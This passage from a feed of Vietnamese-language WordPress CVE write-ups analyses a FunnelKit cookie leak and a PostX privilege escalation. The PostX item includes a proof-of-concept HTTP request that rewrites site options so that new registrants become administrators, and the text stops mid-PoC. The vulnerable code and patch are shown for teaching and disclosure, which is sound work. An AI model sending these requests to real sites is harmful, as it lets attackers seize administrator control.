password&lt;/strong&gt; ƒë·ªÉ ƒë·∫∑t m·∫≠t kh·∫©u m·ªõi.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;ƒêƒÉng nh·∫≠p l·∫°i h·ªá th·ªëng v·ªõi quy·ªÅn &lt;strong&gt;admin&lt;/strong&gt; b·∫±ng m·∫≠t kh·∫©u v·ª´a t·∫°o.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-7654 xu·∫•t ph√°t t·ª´ shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; cho ph√©p ƒë·ªçc cookie x√°c th·ª±c m√† kh√¥ng ki·ªÉm so√°t quy·ªÅn, d·∫´n ƒë·∫øn r√≤ r·ªâ &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; v√† m·ªü ƒë∆∞·ªùng cho leo thang ƒë·∫∑c quy·ªÅn. Vi·ªác k·∫øt h·ª£p shortcode v·ªõi HTML attribute bi·∫øn h√†nh vi hi·ªÉn th·ªã d·ªØ li·ªáu th√†nh k√™nh exfiltration. B·∫£n v√° v3.12.0 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch ch·∫∑n c√°c cookie nh·∫°y c·∫£m theo pattern.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Shortcode ƒë·ªçc cookie l√† thi·∫øt k·∫ø nguy hi·ªÉm.&lt;/li&gt;&#xA;&lt;li&gt;HTML attribute injection c√≥ th·ªÉ d·∫´n ƒë·∫øn r√≤ r·ªâ d·ªØ li·ªáu x√°c th·ª±c.&lt;/li&gt;&#xA;&lt;li&gt;Contributor v·∫´n c√≥ th·ªÉ tr·ªü th√†nh vector leo thang ƒë·∫∑c quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;Cookie &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; ƒë·ªß ƒë·ªÉ chi·∫øm quy·ªÅn gi√°n ti·∫øp.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n x√°c minh th·ª±c t·∫ø b·∫£n v√° trong m√£ ngu·ªìn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/funnel-builder/vulnerability/wordpress-funnelkit-plugin-3-11-0-2-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Funnel Builder by FunnelKit Plugin &amp;lt;= 3.11.0.2 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53425 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-05-cve-2025-55707/</link>
      <pubDate>Mon, 05 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-05-cve-2025-55707/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-05-cve-2025-55707/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;G√°n Quy·ªÅn Kh√¥ng Ch√≠nh X√°c&lt;/strong&gt; (&lt;strong&gt;Incorrect Privilege Assignment&lt;/strong&gt;) trong &lt;strong&gt;PostX, Inc. PostX PostX-lite&lt;/strong&gt; cho ph√©p &lt;strong&gt;Leo Thang ƒê·∫∑c Quy·ªÅn&lt;/strong&gt; (&lt;strong&gt;Privilege Escalation&lt;/strong&gt;). V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;PostX&lt;/strong&gt; t·ª´ &lt;strong&gt;n/a&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;&amp;lt;= 4.1.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53425&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53425&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.35&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.36&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PostX Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;PostX&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.35&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.36&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    &amp;#39;ultp/v1&amp;#39;,&#xA;    &amp;#39;/postx_presets/&amp;#39;,&#xA;    array(&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;  =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39; =&amp;gt; array($this, &amp;#39;postx_presets_callback&amp;#39;),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                return current_user_can(&amp;#39;edit_posts&amp;#39;);&#xA;            },&#xA;            &amp;#39;args&amp;#39; =&amp;gt; array()&#xA;        )&#xA;    )&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi c·∫•u h√¨nh tr√™n, API ƒë∆∞·ª£c expose d∆∞·ªõi d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi c√≥ request g·ª≠i ƒë·∫øn endpoint n√†y v·ªõi method POST, WordPress s·∫Ω g·ªçi &lt;code&gt;postx_presets_callback()&lt;/code&gt;. Tuy nhi√™n, tr∆∞·ªõc khi h√†m n√†y ƒë∆∞·ª£c th·ª±c thi, request b·∫Øt bu·ªôc ph·∫£i v∆∞·ª£t qua b∆∞·ªõc ki·ªÉm tra quy·ªÅn th√¥ng qua &lt;code&gt;current_user_can(&#39;edit_posts&#39;)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Quy·ªÅn &lt;code&gt;edit_posts&lt;/code&gt; ƒë∆∞·ª£c c·∫•p cho ng∆∞·ªùi d√πng c√≥ role &lt;strong&gt;Contributor&lt;/strong&gt; tr·ªü l√™n. Trong khi ƒë√≥, l·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë l·∫°i y√™u c·∫ßu quy·ªÅn &lt;strong&gt;Editor&lt;/strong&gt;. Do s·ª± kh√°c bi·ªát n√†y, c·∫ßn ti·∫øp t·ª•c ph√¢n t√≠ch n·ªôi dung c·ªßa h√†m &lt;code&gt;postx_presets_callback()&lt;/code&gt; ƒë·ªÉ x√°c ƒë·ªãnh nguy√™n nh√¢n v√† c√°ch l·ªó h·ªïng c√≥ th·ªÉ b·ªã khai th√°c.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function postx_presets_callback($server) {&#xA;    $post = $server-&amp;gt;get_params();&#xA;    $type = isset($post[&amp;#39;type&amp;#39;]) ? $post[&amp;#39;type&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $key = isset($post[&amp;#39;key&amp;#39;]) ? $post[&amp;#39;key&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $data = isset($post[&amp;#39;data&amp;#39;]) ? $post[&amp;#39;data&amp;#39;] : &amp;#39;&amp;#39;;&#xA;&#xA;    if ( $type ) {&#xA;        if ( $type == &amp;#39;set&amp;#39; ) {&#xA;            if ( current_user_can(&amp;#39;edit_others_posts&amp;#39;) ) {&#xA;                update_option($key, $data);&#xA;            }&#xA;            return [&amp;#39;success&amp;#39; =&amp;gt; true];&#xA;        } else {&#xA;            return [&amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; get_option($key, [])];&#xA;        }&#xA;    } else {&#xA;        return [&amp;#39;success&amp;#39; =&amp;gt; false];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m callback l·∫•y c√°c tham s·ªë &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;key&lt;/code&gt; v√† &lt;code&gt;data&lt;/code&gt; t·ª´ request. Khi &lt;code&gt;type&lt;/code&gt; b·∫±ng &lt;code&gt;&#39;set&#39;&lt;/code&gt;, h√†m s·∫Ω g·ªçi &lt;code&gt;update_option()&lt;/code&gt; ƒë·ªÉ c·∫≠p nh·∫≠t option t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;$key&lt;/code&gt;, v·ªõi ƒëi·ªÅu ki·ªán ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;code&gt;edit_others_posts&lt;/code&gt; (ch·ªâ d√†nh cho role &lt;strong&gt;Editor&lt;/strong&gt; tr·ªü l√™n). Trong c√°c tr∆∞·ªùng h·ª£p c√≤n l·∫°i, h√†m tr·∫£ v·ªÅ gi√° tr·ªã c·ªßa option th√¥ng qua &lt;code&gt;get_option()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ v·∫≠y, c√≥ th·ªÉ th·∫•y r√µ l√Ω do l·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë v·ªõi y√™u c·∫ßu quy·ªÅn &lt;strong&gt;Editor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;M·ªôt k·ªãch b·∫£n ph·ªï bi·∫øn ƒë·ªÉ khai th√°c l·ªó h·ªïng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; th√¥ng qua h√†m &lt;code&gt;update_option()&lt;/code&gt; l√†:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;ƒê·∫∑t &lt;code&gt;users_can_register = 1&lt;/code&gt; ƒë·ªÉ cho ph√©p ng∆∞·ªùi d√πng t·ª± ƒëƒÉng k√Ω&lt;/li&gt;&#xA;&lt;li&gt;ƒê·∫∑t &lt;code&gt;default_role = administrator&lt;/code&gt; ƒë·ªÉ c√°c t√†i kho·∫£n m·ªõi ƒë∆∞·ª£c t·∫°o c√≥ quy·ªÅn Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhi√™n, do ƒë√¢y l√† m·ªôt REST API s·ª≠ d·ª•ng ph∆∞∆°ng th·ª©c &lt;strong&gt;POST&lt;/strong&gt;, n√™n khi ƒë∆∞·ª£c g·ªçi t·ª´ tr√¨nh duy·ªát, request b·∫Øt bu·ªôc ph·∫£i k√®m theo nonce. V·ªõi c√°c REST request c√≥ kh·∫£ nƒÉng thay ƒë·ªïi d·ªØ li·ªáu (POST / PUT / DELETE), WordPress y√™u c·∫ßu nonce ƒë·ªÉ ch·ªëng t·∫•n c√¥ng CSRF. N·∫øu request kh√¥ng c√≥ nonce, WordPress s·∫Ω t·ª´ ch·ªëi v·ªõi l·ªói &lt;code&gt;rest_forbidden&lt;/code&gt;; n·∫øu nonce kh√¥ng h·ª£p l·ªá, request s·∫Ω b·ªã ch·∫∑n v·ªõi l·ªói &lt;code&gt;rest_cookie_invalid_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ l·∫•y ƒë∆∞·ª£c REST API nonce, ta c·∫ßn ƒëƒÉng nh·∫≠p v√†o Admin Dashboard v√† g·ªçi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; trong &lt;strong&gt;browser console&lt;/strong&gt; khi t·∫°o post, v√¨ nonce n√†y ch·ªâ ƒë∆∞·ª£c WordPress inject v√†o trang khi ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p h·ª£p l·ªá. ƒê√¢y l√† tr∆∞·ªùng h·ª£p ƒë·∫∑c bi·ªát, n√≥ ƒë∆∞·ª£c inject v√†o trang khi t·∫°o post.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;strong&gt;v4.1.36&lt;/strong&gt; ƒë√£ si·∫øt ch·∫∑t ki·ªÉm so√°t quy·ªÅn b·∫±ng c√°ch thay ƒë·ªïi &lt;code&gt;permission_callback&lt;/code&gt; nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;    return current_user_can(&amp;#39;manage_options&amp;#39;); // Admins only&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi thay ƒë·ªïi n√†y, ch·ªâ ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;code&gt;manage_options&lt;/code&gt; (role &lt;strong&gt;Administrator&lt;/strong&gt;) m·ªõi c√≥ th·ªÉ truy c·∫≠p endpoint, qua ƒë√≥ ngƒÉn ch·∫∑n kh·∫£ nƒÉng khai th√°c l·ªó h·ªïng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; t·ª´ c√°c role th·∫•p h∆°n.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Editor (Authenticated User)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access Admin / Create Post Page&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress injects wpApiSettings.nonce&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Editor obtains REST API nonce&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;POST /wp-json/ultp/v1/postx_presets/&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;X-WP-Nonce validation&amp;#34;]&#xA;&#xA;F -- Invalid --&amp;gt; G[&amp;#34;Request rejected&amp;#34;]&#xA;F -- Valid --&amp;gt; H[&amp;#34;permission_callback: current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;&#xA;H -- No --&amp;gt; I[&amp;#34;Access denied&amp;#34;]&#xA;H -- Yes --&amp;gt; J[&amp;#34;postx_presets_callback()&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;type == &amp;#39;set&amp;#39;?&amp;#34;}&#xA;K -- No --&amp;gt; L[&amp;#34;get_option()&amp;#34;]&#xA;K -- Yes --&amp;gt; M{&amp;#34;current_user_can(&amp;#39;edit_others_posts&amp;#39;)?&amp;#34;}&#xA;&#xA;M -- No --&amp;gt; N[&amp;#34;Return success without update&amp;#34;]&#xA;M -- Yes --&amp;gt; O[&amp;#34;update_option(key, data)&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Modify sensitive wp_options&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Privilege escalation via default_role / users_can_register&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;D√πng Editor account ƒë·ªÉ t·∫°o post&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; trong &lt;strong&gt;browser console&lt;/strong&gt; ƒë·ªÉ l·∫•y nonce&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i request v·ªõi nonce v·ª´a l·∫•y:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request 1&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/ HTTP/1.1&#xA;Host: localhost&#xA;Cookie: editor_cookie &#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;type=set&amp;amp;key=users_can_register&amp;amp;data=1&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request 2&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST 